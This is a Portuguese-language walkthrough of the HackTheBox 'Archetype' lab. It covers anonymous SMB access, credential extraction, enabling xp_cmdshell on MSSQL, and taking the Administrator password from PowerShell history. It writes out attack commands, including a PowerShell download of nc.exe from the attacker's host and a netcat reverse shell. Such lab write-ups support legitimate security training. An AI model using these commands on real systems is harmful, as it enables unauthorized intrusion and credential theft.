Archetype

HackTheBox · Very Easy by Brenno M.

Archetype encadeia enumeração de SMB, execução de comandos via MSSQL (xp_cmdshell) e escalação de privilégios a partir do histórico do PowerShell. É o primeiro laboratório do Starting Point com uma cadeia completa até o Administrator.

Reconhecimento

O Nmap identifica SMB (445) e MSSQL (1433). O compartilhamento backups é acessível de forma anônima e contém o arquivo prod.dtsConfig.

nmap -sC -sV <IP>
smbclient -N -L \\\\<IP>\\
smbclient -N \\\\<IP>\\backups
get prod.dtsConfig

O arquivo de configuração expõe as credenciais de conexão do banco de dados (usuário sql_svc).

Foothold - MSSQL

Com o mssqlclient (Impacket) conecta-se ao MSSQL. O usuário tem papel sysadmin, o que permite habilitar o xp_cmdshell e executar comandos no sistema.

python3 mssqlclient.py ARCHETYPE/sql_svc@<IP> -windows-auth
SELECT is_srvrolemember('sysadmin');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell "whoami"

Para uma shell estável, hospeda-se o nc.exe em um servidor SMB/HTTP local e dispara-se uma reverse shell como sql_svc.

xp_cmdshell "powershell -c iwr -uri http://<MEU_IP>/nc.exe -out C:\\Users\\Public\\nc.exe"
xp_cmdshell "C:\\Users\\Public\\nc.exe -e cmd.exe <MEU_IP> 4444"

Escalação de privilégios

Na enumeração local, o histórico do PowerShell revela a senha do Administrator em texto claro.

type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# net use \\...  ADMINISTRATOR  <SENHA>

Com a credencial (administrator:<SENHA>), o psexec do Impacket entrega uma shell como Administrator, e a flag de root é lida na área de trabalho.

python3 psexec.py administrator@<IP>
type C:\Users\Administrator\Desktop\root.txt
